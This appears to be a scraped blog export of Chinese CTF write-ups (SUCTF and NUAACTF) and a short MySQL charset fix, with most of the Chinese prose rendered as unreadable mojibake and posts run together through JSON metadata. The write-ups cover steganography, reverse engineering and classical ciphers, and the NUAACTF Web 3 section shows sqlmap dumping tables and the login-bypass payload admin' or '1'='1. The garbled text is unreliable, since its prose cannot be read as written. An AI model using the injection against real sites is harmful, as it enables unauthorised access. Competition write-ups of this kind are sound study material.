ä¸€ä¸‹å‘ç°æ˜¯ gzip å‹ç¼©è¿‡çš„ã€‚æƒ³ç”¨ gzip -d SU è§£å‹ï¼Œç„¶è€ŒæŠ¥äº†ä¸€ä¸ª gzip: SU: unknown suffix -- ignored.é‡å‘½åä¸º SU.gzï¼Œç„¶åè§£å‹ï¼Œå¾—åˆ°ä¸€ä¸ª rot13 ç¼–ç çš„å­—ç¬¦ä¸²ã€‚è§£å¯†ä¸€ä¸‹ï¼š12codecs.encode('fhpgs&#123;CP9PuHsGx#&#125;', 'rot13')'suctf&#123;PC9ChUfTk#&#125;'å…³äº gzip è§£å‹çš„é—®é¢˜ï¼Œè¿˜æœ‰ä¸¤ç§æ–¹æ³•ï¼šgunzip -d SUï¼Œgunzip ä¸ä¼šç®¡æ–‡ä»¶åï¼Œç›´æ¥è§£å‹åæŠŠå†…å®¹æ‰”åˆ° stdout ä¸Šã€‚cat SU | gzip -d, ç”¨ç®¡é“æŠŠ SU çš„ å†…å®¹è¾“å‡ºæ¥ã€‚å°æ’æ›²ï¼šä¸Šé¢é‚£ä¸ª rot13 çš„å­—ç¬¦ä¸²é‡Œæœ‰ä¸ªäº•å·ï¼Œä¼šè§¦å‘ hexo çš„ä¸€ä¸ªè°œä¹‹ bugâ€¦è›‹ç–¼ã€‚ è¿™ä¸æ˜¯å®¢æœçš„å¤´åƒå˜›ã€‚ã€‚ã€‚ã€‚23333ä¸‹è½½å‡ºä¸€å¼ å›¾ç‰‡ï¼Œä¸€å¼  jpgï¼ŒEXIF çœ‹ä¸å‡ºåå ‚ï¼Œstegsolve ä¹Ÿçœ‹ä¸å‡ºæ¥é—®é¢˜ã€‚binwalk ä¸€ä¸‹ï¼Œé‡Œé¢æœ‰ä¸ªå‹ç¼©åŒ…ï¼Œç„¶åç”¨ dd æå‡ºæ¥ï¼š12345678910$ binwalk xu.jpg DECIMAL HEX DESCRIPTION-------------------------------------------------------------------------------------------------------46046 0xB3DE RAR archive data $ dd if=xu.jpg of=xu.rar bs=1 skip=4604620221+0 records in20221+0 records out20221 bytes (20 kB) copied, 0.294344 s, 68.7 kB/sæå‡ºæ¥è§£å‹ï¼Œå¾—åˆ°ä¸€ä¸ª img é•œåƒï¼ŒæŒ‚è½½ä¸€ä¸‹ï¼Œé‡Œé¢æœ‰å››å¼ å›¾ç‰‡ï¼Œæ‹¼èµ·æ¥æ˜¯ä¸ªäºŒç»´ç ï¼Œæ‰«ä¸€æ‰«å¾—åˆ° flag: suctf{bOQXxNoceB} Forensic-250Can you fix it?Fix the file in the rarTips:Audioæ–‡ä»¶ã€‚è§£å‹å‡ºæ¥ï¼Œå‘ç°æ˜¯ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼š1ff 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 74 14 45 50 d8 e3 f9 07 bf c7 â€¦çœŸæ˜¯ä¸§å¿ƒç—…ç‹‚ï¼ŒæŠŠå­—èŠ‚æ‹†å‡ºæ¥å†™åˆ°æ–‡æœ¬æ–‡ä»¶é‡ŒğŸ˜‚ å†™ä¸ªç¨‹åºè½¬ä¸€ä¸‹ã€‚è½¬å‡ºæ¥å°±ä¸çŸ¥é“å¹²ä»€ä¹ˆäº†â€¦ æ„Ÿè§‰æ˜¯ä¸ªæ–‡ä»¶å¤´ï¼Œä½†æ˜¯ä½ è¿™ä¸ªæ–‡ä»¶å¤´å…¨è¢« 00 åˆ·æ‰äº†ï¼Ÿè¿™å°¼ç›æ€ä¹ˆä¿®ğŸŒšç„¶åçº¿ç´¢å°±æ–­äº†ã€‚ Re å…ˆåˆ©å…¶å™¨ä¸‹è½½ä¸€ä¸ªæ–‡ä»¶ã€‚æ‹–è¿› IDAï¼Œæ‰¾åˆ°ä¸¤æ®µä»£ç ï¼š123456789101112131415161718192021// ...if ( num &gt; 9 ) &#123; plaintext = 'I'; flag(&amp;plaintext);&#125;// ... signed int __cdecl flag(int *ret) &#123; ret[12] = 'a'; ret[11] = '6'; ret[10] = 'I'; ret[9] = '_'; ret[8] = 'e'; ret[7] = '5'; ret[6] = 'U'; ret[5] = '_'; ret[4] = 'n'; ret[3] = '@'; ret[2] = 'c'; return 1;&#125;ç„¶åæ‹¼èµ·æ¥ï¼Œflag é‡Œè¿˜å·®ä¸ªä¸‹åˆ’çº¿ï¼Œæ²¡çœ‹ä»£ç ï¼ŒçŒœå‡ºæ¥äº†ï¼šsuctf{I_c@n_U5e_I6a} PE_Formatæ–‡ä»¶ã€‚ä¸æ‡‚ PE æ ¼å¼ï¼Œä¸‹ä¸‹æ¥ä»¥åçœ‹äº†åŠå¤©ã€‚åæ¥å‘ç°å‡ºé¢˜äººç«Ÿç„¶æŠŠ MZ å¤´å’Œ PE å¤´é‡Œçš„ MZ å’Œ PE ç»™è°ƒè¿‡æ¥äº†ğŸ˜‚ æ”¹æ­£åï¼ŒæŠŠ MZ å¤´ä¸­ PE å¤´çš„ä½ç½®ä» 0x40 æ”¹åˆ° 0x80, ç¨‹åºå°±èƒ½è·‘èµ·æ¥äº†ã€‚æ‹–åˆ° IDA é‡Œåç¼–è¯‘ï¼Œç¨‹åºç«Ÿç„¶æ˜¯ç”¨ Cè‰¹ å†™çš„â€¦å•ƒä»£ç å•ƒä»£ç ï¼Œæœ€åå‘ç° flag è¢«æŒ‰ä½éäº†ï¼Œå†™ä¸ªç¨‹åºè§£å‡ºæ¥ï¼š12345678910111213141516171819#include &lt;stdio.h&gt;#include &lt;string.h&gt; // char secret[] = \"Â»Â Â¦ÂÅ  â€â€˜ÂË† Â¯Âº Â¹ÂÂâ€™Å¾â€¹Ã€\";char secret[] = \"\\xBB\\x90\\xA0\\xA6\\x90\\x8A\\xA0\\x94\\x91\\x90\\x88\\xA0\\xAF\\xBA\\xA0\\xB9\\x90\\x8D\\x92\\x9E\\x8B\\xC0\";char v35[40]; int main()&#123; char c; int len = strlen(secret); memset(v35, 0, 30); strcpy(v35, secret); for (int i = 0; i &lt; len; i++) v35[i] = ~v35[i]; printf(\"%s\\n\", v35); return 0;&#125;å¾—åˆ° flag: suctf{Do_You_know_PE_Format?}. Find_correct_pathæ–‡ä»¶ã€‚çœ‹æºç ï¼š1234567891011121314151617181920212223242526272829303132333435363738int __cdecl main(int argc, const char **argv, const char **envp)&#123; int result; // eax@2 char s; // [sp+Ch] [bp-2Ch]@1 char v5; // [sp+20h] [bp-18h]@1 int v6; // [sp+28h] [bp-10h]@11 int v7; // [sp+2Ch] [bp-Ch]@1 v7 = 0; memset(&amp;s, 0, 0x14u); __isoc99_scanf((const char *)&amp;unk_8048D40, &amp;v5); if ( v7 ) &#123; switch ( v7 ) &#123; case 1: choose1((int)&amp;s); break; case 2: choose2((int)&amp;s); break; case 3: choose3((int)&amp;s); break; case 4: choose4((int)&amp;s); break; &#125; v6 = strlen(&amp;s); final((int)&amp;s, v6); result = 0; &#125; else &#123; result = 1; &#125; return result;&#125;å‘ç°ç¨‹åºè¯»å…¥ v5 çš„å€¼ï¼Œåé¢å´åˆ¤æ–­äº† v7. æ‰”åˆ° Linux ä¸‹åŠ¨æ€è°ƒè¯•ã€‚ä¸€å¼€å§‹è€æ˜¯æŠ¥ â€œNo such file or directoryâ€, åæ¥å‘ç°æ²¡æœ‰ libc6 é“¾æ¥åº“ã€‚ç„¶åç”¨ gdbï¼Œåœ¨ v7 èµ‹å€¼åä¸‹æ–­ç‚¹ï¼Œæ”¹æ‰ v7 çš„å€¼ï¼Œç„¶åè®©ç¨‹åºç»§ç»­è¿è¡Œã€‚æœ€åå¾—åˆ° flag: suctf{Thl5_way_ls_r!8ht}.çœ‹å°ä¼™ä¼´çš„ Writeup æ—¶ï¼Œå‘ç° IDA åç¼–è¯‘å‡ºçš„æºç æ˜¯å¯ä»¥åœ¨ Linux ä¸­ç¼–è¯‘çš„ï¼Œä»–ç›´æ¥æŠŠæºç é‡Œçš„ v5 æ”¹æˆ v7ï¼Œç„¶åç¼–è¯‘ä¸€ä¸‹å°±å‡ºæ¥äº†ã€‚ç¥å¥‡ğŸ˜³ reverse04æ–‡ä»¶ã€‚å°¼ç›ï¼Œä¸ºå•¥é¢˜ç›®æ˜¯ 04ï¼Œæ–‡ä»¶æ˜¯ 03â€¦ç¨‹åºé‡Œç”¨äº†å„ç§ååŠ¨æ€è°ƒè¯•æŠ€æœ¯ï¼Œäºæ˜¯æˆ‘å°±é™æ€åˆ†æäº†ï¼Œåæ­£ä¹Ÿä¸ä¼šã€‚ç»“æœåˆ†æäº†åŠå¤©ï¼Œå„ç§ç®—åœ°å€ï¼Œæœ€åç®—å‡ºæ¥çš„ flag éƒ½æœ‰é—®é¢˜ï¼Œå°±æ”¾å¼ƒäº†â€¦æ®è¯´æˆ‘åªè·Ÿ flag å·®ä¸€ä¸ªå‡¯æ’’åŠ å¯†ï¼Ÿå™«ï¼Œé‚£å¤©çŠ¶æ€çœŸæ˜¯å·®ã€‚flag: suctf{antidebugabc}. Crypto base??MMZVM2TEI5NDOU2WHB4GEM22NRMDCTRRMZIT2PI= å…¨å¤§å†™ï¼Œæ ¹æ®é¢˜ç›®åˆ¤æ–­åº”è¯¥æ˜¯ base32. è§£å‡ºæ¥ä¸€æ®µ base64, å†è§£å¯†å¾—åˆ° flag: suctf{I_1ove_Su}. å‡¯æ’’å¤§å¸OK, å‡¯æ’’å¯†ç ï¼Œæš´åŠ›æšä¸¾ä¸€ä¸‹ï¼Œæœ€åå‘ç°æœ‰ä¸¤ä¸ªå­—ç¬¦ä¸²æ‹¼èµ·æ¥ï¼Œèƒ½å¾—åˆ° suctf{I_am_Cathar}.ç„¶åè›‹ç–¼çš„åœ°æ–¹å°±æ¥äº†ã€‚é¼“æ£äº†ä¸€æ™šä¸Šï¼Œkey å„ç§é”™ï¼Œåæ¥åŒå­¦å‘Šè¯‰æˆ‘è¯´ï¼Œkey æ˜¯ Caesarâ€¦ ç‰¹ä¹ˆç«Ÿç„¶æ˜¯æ•…æ„å†™é”™çš„ï¼Ÿ_(:Ğ·ã‚âˆ )_ easyRSAæ–‡ä»¶è§£å‡ºæ¥æ˜¯ RSA çš„å…¬é’¥å’ŒåŠ å¯†å†…å®¹ã€‚æ‰¾äº†ä¸ª Writeupï¼Œç…§ç€åšï¼Œåˆ†è§£è´¨å› æ•°ç”¨ yafu æå®šï¼Œæœ€åå¾—åˆ° flag: suctf{Rsa_1s_ea5y}. æ™®è±è´¹å°”C:prewglqkobbmxgkyzmvymlWW91IGFyZSBsdWNreQ==Playfair å¯†ç ã€‚å¯†é’¥æ˜¯åé¢é‚£ä¸ª base64 è§£å‡ºæ¥çš„ã€‚ç„¶è€Œï¼ŒPlayfair çš„åŠ å¯†çŸ©é˜µæ„é€ æ–¹å¼å¥½åƒæœ‰å¥½å¤šç§ï¼Œæ‰€ä»¥æ‰¾äº†å¥½å‡ ä¸ªåœ¨çº¿è§£å¯†ç½‘ç«™ï¼Œæœ€åæ‰¾åˆ° è¿™ä¸ªï¼ŒæŠŠ flag è§£å‡ºæ¥äº†ï¼šsuctf{charleswheatstone} æ€»ç»“ï¼ˆè¯´ç‚¹é—²è¯ï¼‰è¿™æ¬¡ CTF æ˜¯ä¸ªäººèµ›ï¼Œä¸ºæœŸä¸€å‘¨ï¼Œå¾ˆå¤šé¢˜éƒ½æ˜¯åœ¨å·¥ä½œæ—¥ä¸‹ç­ä¹‹åå®Œæˆçš„ï¼Œæ‰€ä»¥åšé¢˜çš„æ—¶å€™è€å¿ƒå°‘äº†ä¸€ç‚¹ï¼Œå¾ˆå¤šé¢˜åŠå¤©æ²¡åšå‡ºæ¥å°±æ”¾å¼ƒäº†ï¼ˆæ¯”å¦‚ Android Studio é‚£é“é¢˜ï¼‰ã€‚åšå®¢åˆå¾ˆä¹…æ²¡æ›´æ–°äº†ï¼Œä¸ƒæœˆåˆ°åä¸€æœˆåœ¨å®ä¹ ï¼Œæ¯å¤©æ²‰è¿·å·¥(yu)ä½œ(le)ï¼Œæ²¡æœ‰ä»€ä¹ˆå¿ƒæ€å»å­¦ä¹ ã€å»æé«˜ã€‚ç°åœ¨å®ä¹ ç»“æŸäº†ï¼Œå´æ¬ äº†ä¸€å †ä½œä¸šæ²¡åšã€‚ç­‰æˆ‘æŠŠä½œä¸šéƒ½åšå®Œï¼Œå†æ¥æ›´æ–°å§ã€‚å¤§æ¦‚ä¼šå†™ä¸€ç¯‡ Django REST Framework çš„å…¥é—¨æŒ‡å—ï¼ŸğŸ˜³","categories":[{"name":"ä¹±ä¸ƒå…«ç³Ÿ","slug":"ä¹±ä¸ƒå…«ç³Ÿ","permalink":"https://blog.stdioa.com/categories/ä¹±ä¸ƒå…«ç³Ÿ/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://blog.stdioa.com/tags/CTF/"},{"name":"è„‘æ´","slug":"è„‘æ´","permalink":"https://blog.stdioa.com/tags/è„‘æ´/"}]},{"title":"è§£å†³ MySQL ç¼–ç é—®é¢˜","slug":"django-mysql-charset-problem","date":"2016-05-09T01:40:46.000Z","updated":"2017-06-29T04:38:39.983Z","comments":true,"path":"2016/05/django-mysql-charset-problem/","link":"","permalink":"https://blog.stdioa.com/2016/05/django-mysql-charset-problem/","excerpt":"å¾ˆä¹…ä»¥å‰å†™äº†ä¸€ä¸ª Django é¡¹ç›®ï¼Œæ•°æ®åº“ç”¨çš„ MySQL. å¾ˆä¹…æ²¡ç”¨ï¼Œåæ¥å‘ç° MySQL ç¼–ç è®¾ç½®æœ‰é—®é¢˜ï¼Œå¯¼è‡´ä¸­æ–‡å…¨éƒ¨å˜æˆäº†é—®å·ã€‚","text":"å¾ˆä¹…ä»¥å‰å†™äº†ä¸€ä¸ª Django é¡¹ç›®ï¼Œæ•°æ®åº“ç”¨çš„ MySQL. å¾ˆä¹…æ²¡ç”¨ï¼Œåæ¥å‘ç° MySQL ç¼–ç è®¾ç½®æœ‰é—®é¢˜ï¼Œå¯¼è‡´ä¸­æ–‡å…¨éƒ¨å˜æˆäº†é—®å·ã€‚ 1. è®¾ç½® MySQL æœåŠ¡ç«¯é»˜è®¤å­—ç¬¦é›†åœ¨ my.cnf ä¸­è®¾ç½®é»˜è®¤å­—ç¬¦é›†ï¼š12[mysqld]character-set-server=utf8åŒæ—¶ï¼Œå¯ä»¥è®¾ç½® MySQL å®¢æˆ·ç«¯çš„é»˜è®¤å­—ç¬¦é›†ï¼š12[mysql]character-set-default=utf-8é…ç½®å®Œæˆåï¼Œé‡å¯ MySQL æœåŠ¡ï¼Œè¾“å…¥ SHOW VARIABLES LIKE '%CHAR'; æ£€æŸ¥å­—ç¬¦é›†æ˜¯å¦æ­£ç¡®ã€‚ 2. æ‰‹åŠ¨è®¾ç½®æ•°æ®åº“ç¼–ç ä¿®æ”¹é»˜è®¤ç¼–ç å…¶å®æ˜¯æ²¡ç”¨çš„ğŸ˜‚ï¼Œè¿˜éœ€è¦æ‰‹åŠ¨è®¾ç½®æ•°æ®åº“ç¼–ç ï¼Œè€Œæ•°æ®åº“ç¼–ç éœ€è¦åœ¨å»ºç«‹æ—¶æŒ‡å®šï¼Œæ‰€ä»¥â€¦çœŸæ˜¯ä¸€ä¸ªæ‚²ä¼¤çš„æ•…äº‹ğŸ˜¢ï¼ˆåæ­£æˆ‘çš„æœåŠ¡ä¹Ÿæ²¡äººç”¨é‡æ–°å»ºç«‹æ•°æ®åº“ï¼š12DROP DATABASE spaste;CREATE DATABASE spaste DEFAULT CHARACTER SET utf8;é‡å»ºæ•°æ®åº“åï¼Œè¾“å…¥ python manager.py migrate é‡æ–°è¿ç§»æ•°æ®åº“ã€‚ 3. å‚è€ƒèµ„æ–™Configuring the Character Set and Collation for Applications - MySQL 5.7 Reference Manualdjango è§£å†³ mysql æ•°æ®åº“è¾“å…¥ä¸­æ–‡ä¹±ç é—®é¢˜ 4. åè®°å¥½çŸ­çš„ä¸€ç¯‡æ–‡ç« â€¦æœ€è¿‘åœ¨çˆ¬ B ç«™ç”¨æˆ·çš„å…¬å¼€ç”¨æˆ·æ•°æ®ï¼Œæ•°æ®åº“ç”¨äº† MongoDB, çˆ¬å®Œä»¥åå¥½å¥½ç©ä¸€ç©ğŸ˜³B ç«™åŸºä½¬å¥½å¤šå•Š_(:Ğ·ã‚âˆ )_","categories":[{"name":"å¼€å‘","slug":"å¼€å‘","permalink":"https://blog.stdioa.com/categories/å¼€å‘/"}],"tags":[{"name":"Django","slug":"Django","permalink":"https://blog.stdioa.com/tags/Django/"},{"name":"MySQL","slug":"MySQL","permalink":"https://blog.stdioa.com/tags/MySQL/"}]},{"title":"ç¬¬ä¸€å±Š NUAACTF éå®˜æ–¹ Writeup","slug":"nuaactf-unofficial-writeup","date":"2016-04-25T04:01:04.000Z","updated":"2017-06-29T04:38:40.638Z","comments":true,"path":"2016/04/nuaactf-unofficial-writeup/","link":"","permalink":"https://blog.stdioa.com/2016/04/nuaactf-unofficial-writeup/","excerpt":"å­¦æ ¡ç»„ç»‡äº†ç¬¬ä¸€å±Š NUAACTFï¼Œå‚åŠ å»ç©ç©ï¼Œå¼€å¼€è„‘æ´ğŸ˜‚ï¼Œå—¯ï¼Œè¿˜è›®å¥½ç©çš„~","text":"å­¦æ ¡ç»„ç»‡äº†ç¬¬ä¸€å±Š NUAACTFï¼Œå‚åŠ å»ç©ç©ï¼Œå¼€å¼€è„‘æ´ğŸ˜‚ï¼Œå—¯ï¼Œè¿˜è›®å¥½ç©çš„~ Web 0huanâ€™yingâ€™laiâ€™daoç­¾åˆ°é¢˜ï¼ŒF12 å³å¯å¾—åˆ° flag.Flag è—åœ¨é¡µé¢çš„æŸä¸ª js æ–‡ä»¶é‡Œï¼Œç”¨ jsfuck æ··æ·†äº†ã€‚ Web 1ç™¾åº¦ä¸€ä¸‹ï¼Œä½ å°±çŸ¥é“é¢˜ç›®è²Œä¼¼æ”¹è¿‡ä¸€å›ã€‚æ”¹ä¹‹å‰ç›´æ¥ç‚¹å‡»ç½‘é¡µä¸Šçš„ä¸€ä¸ªé“¾æ¥ï¼Œè·³è½¬åˆ°æŸä¸ªç½‘é¡µï¼Œæºä»£ç é‡Œé¢æœ‰ä¸€æ®µ phpï¼Œå…·ä½“å†…å®¹ä¸è®°å¾—äº†ï¼Œé‡Œé¢æœ‰ä¸€ä¸² MD5 095a655fc809cbbdffa207717a5233f5. Google ä¸€ä¸‹æ‰¾åˆ°æŸç™½èœçš„åšå®¢ï¼Œå¾—åˆ°åŸæ–‡ bnVhYWN0ZiU3Qi93ZWIyL2NlYmE2ZmJiZjBlZGU0MzI1MjY0MWNkMzM2ZTM2YTAzJTdE.çœ‹èµ·æ¥åƒ Base64ï¼Œäºæ˜¯ decode ä¸€ä¸‹ï¼Œç„¶å decodeURIComponents å¾—åˆ° flag.åæ¥é¢˜ç›®æ”¹äº†ï¼Œç›´æ¥æŒ‰ç…§é¢˜ç›®è¦æ±‚å»ç™¾åº¦å°±èƒ½ç›´æ¥æ‰¾åˆ°æŸç™½èœçš„åšå®¢ã€‚ Web 2ä¸æ˜¯ bug æ˜¯ featureWeb 2 çš„å…¥å£ç‚¹åœ¨ Web 1 çš„ flag é‡Œã€‚è¿›å»ä»¥åä¼šè·³è½¬åˆ°æŸä¸ª php, ç„¶è€ŒæŸç™½èœåˆæŠŠ php æºç å†™è¿›å»äº†ï¼Œæ€è·¯è·Ÿä¸Šä¸ªé¢˜å¥½åƒä¸€æ ·ï¼Œä¹Ÿæ˜¯å»ç™¾åº¦ä¸€ä¸‹ MD5 å¾—åˆ°å¯†ç ï¼Œæ·»åŠ  GET å‚æ•°å³å¯æ‹¿åˆ° flag. Web 3ç¬¨ç¬¨çš„ç¨‹åºçŒ¿Web 3 çš„å…¥å£ç‚¹åœ¨ Web 2 çš„ flag é‡Œã€‚è¿›å»ä»¥åè·³è½¬åˆ°æŸ php, é‡Œé¢åªæœ‰ä¸€ä¸ªç™»å½•è¡¨å•ã€‚çœ‹èµ·æ¥åƒæ˜¯ SQL æ³¨å…¥ï¼Œå°±ç”¨ sqlmap æ‰«äº†ä¸€ä¸‹ï¼ŒæŠŠè¡¨ dump å‡ºæ¥ï¼Œå‘ç°æœ‰ä¸¤ä¸ªè´¦æˆ· admin å’Œ userï¼Œå¯†ç éƒ½æ˜¯ä¸€å¨çœ‹èµ·æ¥ä»€ä¹ˆéƒ½ä¸åƒçš„ä¸œè¥¿ï¼Œç„¶åçº¿ç´¢å°±æ–­äº†ã€‚æœ€åä¸€ä¸ªå°æ—¶å†³å®šæ‰‹åŠ¨æ³¨å…¥ä¸€ä¸‹ï¼Œç„¶è€Œå¹¶ä¸æ€ä¹ˆä¼š SQL æ³¨å…¥äºæ˜¯å°±æ‰¾äº†å‡ ç¯‡åšå®¢æ¥çœ‹ã€‚æ³¨å…¥äº†åŠå¤©å¯†ç æ¡†å‡æ— æœï¼Œæœ€åè¯•äº†ä¸€ä¸‹æ³¨å…¥ç”¨æˆ·åè¾“å…¥æ¡† admin' or '1'='1ï¼ŒæˆåŠŸç™»å½•ã€‚ç™»å½•ä»¥å flag ä¸€é—ªè€Œè¿‡ï¼Œæœ¬æ¥æƒ³æˆªå±ç„¶è€Œæ‡’å¾—æˆªäº†å°±æŠ“äº†åŒ…ï¼Œæ‹¿åˆ° flag. Web 4 (æœªè§£å‡º)ä½ ä»å“ªé‡Œæ¥ï¼Œæˆ‘çš„æœ‹å‹ã€‚Web 3 æˆåŠŸç™»å½•åå°±è·³è½¬åˆ° Web 4ï¼Œç½‘é¡µå†™ç€&quot;0nly welc0me pe0ple who c0me from http://cs.nuaa.edu.cn &quot;ã€‚ç»“åˆâ€œä½ ä»å“ªé‡Œæ¥â€ï¼Œæƒ³åˆ°äº†è¯·æ±‚æ¥æºï¼Œä½†æ˜¯æˆ‘åªæƒ³åˆ°äº† Referer, ä¿®æ”¹åæ— æœã€‚æ¯”èµ›ç»“æŸåå¬è¯´è¦æ”¹ Origin å’Œ X-Forwarded-For, ç„¶è€Œæ”¹äº†ä¹Ÿæ²¡åšå‡ºæ¥ï¼Œä¸çŸ¥é“å“ªé‡Œå‡ºäº†é—®é¢˜ã€‚ Rev 1æ›¾è€å¸ˆçš„ Android è¯¾æŠŠ apk ä¸‹è½½ä¸‹æ¥ï¼Œç”¨ jd-gui æ‰“å¼€ï¼Œä¸€é˜µä¹±ç¿»ä»¥åå‘ç° flag è—åœ¨ MainActivity.class é‡Œã€‚ Rev 2 (æœªè§£å‡º)å¥‡å¦™çš„å£°éŸ³åˆçœ‹è§å®‰å“äº†ï¼Œä¸‹ä¸‹æ¥ä»¥åä¸€é˜µä¹±ç¿»ï¼Œæ²¡æœ‰å¤´ç»ªã€‚åˆšæ‰çœ‹äº†åˆ«äººçš„é¢˜è§£ï¼Œå‘ç° flag åœ¨èµ„æºç›®å½•é‡Œé¢ã€‚æ‹¿å‡ºæ¥ res/raw/sound.wav, ç”¨éšä¾¿ä»€ä¹ˆé¬¼æ‰“å¼€ï¼ˆæ¥ä¹‹å‰è§è¯†è¿‡è¿™ä¸ªè„‘æ´ï¼Œä¸“é—¨å‡†å¤‡çš„ Sonic Visualiser, ç„¶è€Œå¡ä½äº†æ²¡æœ‰ç”¨ä¸Šï¼‰ï¼Œå‘ç°é‡Œé¢æœ‰å››ä¸ªå£°é“ï¼Œä¸‹é¢ä¸¤ä¸ªå£°é“åƒæ˜¯ä¸ªæ–¹æ³¢ã€‚ç„¶åä¸€ç‚¹ä¸€ç‚¹æ•° 01 æ•°å‡ºæ¥ï¼Œå¾—åˆ°ï¼š011011100111010101100001011000010110001101110100011001100111101101110011011010000011000001110010011101000101111101100110001100010100000101100111æ•°æ ¼å­æ•°çš„çœ¼éƒ½è¦èŠ±äº†â€¦æ¯ä¸€è¡Œ 8 ä½äºŒè¿›åˆ¶è½¬ ASCII ç ï¼Œå¾—åˆ° flag nuaactf{sh0rt_f1Ag, å°‘äº†ä¸€ä¸ªå³æ‹¬å·ğŸ˜‚çœŸæ˜¯å¹¸äº flag çŸ­â€¦é¡ºä¾¿è¯´ä¸€å¥ï¼Œé‚£ä¸ªéŸ³é¢‘çœŸå¥½å¬ï¼Œå¬è¯´æ˜¯é”¤å­æ‰‹æœºçš„é»˜è®¤é“ƒå£°ğŸ˜³ Rev 3ä¸å–œæ¬¢å†™ç•Œé¢çš„ç™½èœå“¥.NET é€†å‘ï¼Œç›´æ¥æ‹–åˆ° IDA é‡Œé¢ï¼Œä¸€é˜µä¹±ç¿»ï¼Œç¿»åˆ°äº†ä¸‰æ®µ base64 å’Œä¸€ä¸ªæ‘©å°”æ–¯ç”µç è¡¨ã€‚æŠŠä¸‰æ®µ base64 æ‹¼èµ·æ¥ä»¥å decode, å¾—åˆ°ä¸€æ®µæ‘©å°”æ–¯ç”µç  -. ..- .- .- -.-. - ..-. 2D3f ... .- .--. .--. -.-- -.-. .-. .- -.-. -....- .---- -. --. -.-. ... ... .- .-. .--. -...--.- (2D3f æ˜¯ä»€ä¹ˆé¬¼ğŸ˜‚)ï¼Œè§£ç åå¾—åˆ° flag NUAACTF{SAPPYCRACK1NGCSSARP}ï¼Œæ”¾åˆ°æºç¨‹åºé‡Œé¢ï¼Œæ˜¾ç¤º flag æ­£ç¡®ã€‚ç„¶åï¼Œæäº¤ä»¥åè¯´ flag ä¸å¯¹ï¼ä¸ºä»€ä¹ˆ flag ä¸æ˜¯ Happy Cracking CSharp? çœ‹äº†åŠå¤©ï¼Œåˆäº¤äº†åŠå¤©çš„ flagï¼Œæ²¡æ‰¾å‡ºé—®é¢˜ã€‚åæ¥å‘ç°ç¨‹åºç¼–ç è¡¨é‡Œé¢ H å’Œ S çš„ç¼–ç ä¸€æ ·ğŸ˜‚ æ‰€ä»¥é‡Œé¢æ‰€æœ‰çš„ S æ¢æˆ Hï¼Œæºç¨‹åºéƒ½ä¼šæç¤º flag æ­£ç¡®â€¦æŠŠ H å’Œ S è½¬æ¢ï¼Œä¸€ä¸ªä¸€ä¸ªè¯•ï¼Œæœ€åè¯•å‡ºæ¥ flag æ˜¯ NUAACTF{HAPPYCRACK1NGCHHARP}ï¼Œä¹Ÿæ˜¯é†‰äººã€‚ Pwn 1ä¹±ç ï¼ä¹±ç ï¼ç­¾åˆ°é¢˜ã€‚ä¸‹è½½ä¸‹æ¥ä¸€ä¸ª txtï¼Œæ‰“å¼€ä»¥åå‘ç°æ˜¯ jsfuckï¼Œæ”¾åˆ°æµè§ˆå™¨é‡Œè¿è¡Œå¾—åˆ° flag. Pwn 2 ï¼ˆæœªè§£å‡ºï¼‰å›å®¶çš„è·¯CTF ç«èµ›è€ƒäº†ç®—æ³•â€¦æœ€çŸ­è·¯â€¦çœŸæ˜¯é†‰é†‰å“’ã€‚ä¸€å¼€å§‹æ²¡æœ‰ç»†æƒ³ï¼Œçå†™äº†ä¸€ä¸ªæ·±åº¦ä¼˜å…ˆæœç´¢ï¼Œå‡ºæ¥å¥½å¤šè§£ï¼Œç„¶è€Œæ²¡æœ‰ä¸€ä¸ªæ˜¯å¯¹çš„ï¼Œä¹Ÿæ˜¯æ‚²å‚¬ã€‚åˆ°æœ€åä¹Ÿæ²¡æœ‰åšã€‚ Misc 1å¥‡æ€ªçš„å‹ç¼©åŒ…å˜›ï¼Œéšå†™çš„é¢˜éƒ½è›®å¥½ç©å“’ğŸ˜œmisc1.rar ä¸‹è½½ä¸‹æ¥åæ— æ³•æ‰“å¼€ï¼Œfile ä¸€ä¸‹å‘ç°æ˜¯ä¸ª PNGï¼Œæ”¹æ‹“å±•ååæ‰“å¼€ï¼Œå¾—åˆ° flagã€‚è¿™ä¸ªä¹Ÿç®—ç­¾åˆ°é¢˜å§ã€‚ Misc 2å¥‡æ€ªçš„å›¾ç‰‡ä¸‹è½½ misc2.png, pngcheck æç¤º additional data after IEND chunk, çœ‹æ¥æœ€åä¸€å—åé¢è¿˜æœ‰ä¸œè¥¿ï¼Œç”¨è®°äº‹æœ¬æ‰“å¼€ï¼Œå‘ç°æ–‡ä»¶æœ€åç”¨æ˜æ–‡å†™ç€ key.åˆšåˆšåœ¨æ–‡ä»¶æœ«å°¾å‘ç°äº†ä¸€ä¸ªæ–‡ä»¶å¤´ PK\\x03\\x04, è§‰å¾—åº”è¯¥æ˜¯ä¸ª zip æ–‡ä»¶ï¼Œbinwalk ä¸€ä¸‹ç„¶åç”¨ dd åˆ†å¼€ï¼Œå¾—åˆ°ä¸€ä¸ª zip æ–‡ä»¶ï¼Œè§£å‹åå¾—åˆ° flag. è¿™åº”è¯¥æ˜¯è¿™ä¸ªé¢˜çš„æ ‡å‡†åšæ³•å§ï¼Œåªæ˜¯ä¸ºä»€ä¹ˆåš zip æ–‡ä»¶çš„æ—¶å€™æ²¡æœ‰å‹ç¼©ğŸŒš Misc 3æ›´å¥‡æ€ªçš„å›¾ç‰‡ï¼ˆä½ ä»¬è¿™èµ·çš„éƒ½æ˜¯ä»€ä¹ˆåå­—ï¼‰ä¸‹è½½ä¸‹æ¥ï¼ˆå¬è¯´è¿™æ˜¯èˆ°å¨˜ï¼Ÿï¼‰ï¼Œpngcheck æ²¡æœ‰é”™è¯¯ï¼Œå¡äº†ä¸€ä¼šã€‚åæ¥ç”¨ PS 